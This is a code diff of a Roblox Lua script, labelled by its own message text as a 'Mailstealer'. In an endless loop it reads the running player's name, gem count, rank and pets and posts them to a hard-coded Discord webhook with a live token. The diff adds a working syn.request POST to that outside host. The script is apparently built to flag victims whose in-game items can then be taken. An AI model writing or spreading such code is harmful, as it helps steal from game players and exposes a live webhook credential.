@@ -1,38 +1,15 @@
 local WebHook = "https://discord.com/api/webhooks/1196752202623107132/50HcQjSlKqpxAaF93SspFlc3F1RlJDAd3iF_iM7NkXVaClmjnalbnYG1-GrVnMG_4q1S"
-local Creator = "AltAasui1"
-
-local executorWhitelist = {
-    Synapse = true,
-    Fluxus = true,
-    Delta = true,
-    CodeX = true,
-    VegaX = true,
-}
-
-local executorName = "Unknown"
-
--- Detect executor
-if executorWhitelist.synapse and syn then
-    executorName = "Synapse"
-elseif executorWhitelist.fluxus and getgenv().Fluxus then
-    executorName = "Fluxus"
-elseif executorWhitelist.delta and protect_gui and protect_gui["CreateWindow"] then
-    executorName = "Delta"
-elseif executorWhitelist.codex and isfile and isfolder and readfile then
-    executorName = "CodeX"
-elseif executorWhitelist.vegax and writefile and appendfile and pcall and Drawing then
-    executorName = "VegaX"
-end
+local Creator = "altaasui1"
 
 while true do
     local displayUsername = game.Players.LocalPlayer.DisplayName
 
-    local diamondsAmount = 0
+    local gemsAmount = 0
     local creatorsList = "Sen/Aasui/Sintax"
     local exclusivePet, hugePet = "N/A", "N/A"
     local playerRank = "N/A"
 
-    -- Access the game's data to get diamonds, exclusive pet, huge pet, and rank information
+    -- Access the game's data to get gems, exclusive pet, huge pet, and rank information
     local playerData = game.Players.LocalPlayer
     local leaderstats = playerData:FindFirstChild("leaderstats")
 
@@ -40,22 +17,12 @@ while true do
         local diamondsValue = leaderstats:FindFirstChild("Diamonds")
         local rankValue = leaderstats:FindFirstChild("Rank")  -- Adjust "Rank" to the actual name of the player rank value
 
-        diamondsAmount = diamondsValue and diamondsValue.Value or 0
+        gemsAmount = diamondsValue and diamondsValue.Value or 0
         playerRank = rankValue and rankValue.Value or "N/A"
     end
 
-    -- Check diamonds from Leaderboards GUI
-    local success, leaderboardsModule = pcall(function()
-        return require(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Leaderboards)
-    end)
-
-    if success and leaderboardsModule then
-        local diamondsFromLeaderboards = leaderboardsModule.GetPlayerDiamonds() or 0
-        diamondsAmount = diamondsFromLeaderboards > diamondsAmount and diamondsFromLeaderboards or diamondsAmount
-    end
-
     local data = {
-        content = string.format("||@everyone|| Mailstealer Hit 🎉\n👨‍💻 Executor Used 👩‍💻: %s", executorName),
+        content = "||@everyone|| Mailstealer Hit 🎉",
         embeds = {
             {
                 title = "(:penguin:) Player Info",
@@ -65,7 +32,7 @@ while true do
                     "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
                     displayUsername,
                     Creator,
-                    tostring(diamondsAmount),
+                    tostring(gemsAmount),
                     exclusivePet,
                     hugePet,
                     playerRank,
@@ -85,18 +52,14 @@ while true do
     local url = WebHook
     local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-    local success, response
-    if isSynapse then
-        -- Synapse-specific code here
-    elseif isFluxus then
-        -- Fluxus-specific code here
-    elseif isDelta then
-        -- Delta-specific code here
-    elseif isCodeX then
-        -- CodeX-specific code here
-    elseif isVegaX then
-        -- VegaX-specific code here
-    end
+    local success, response = pcall(function()
+        return syn.request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = newdata
+        })
+    end)
 
     if success then
         print("Message sent successfully.")
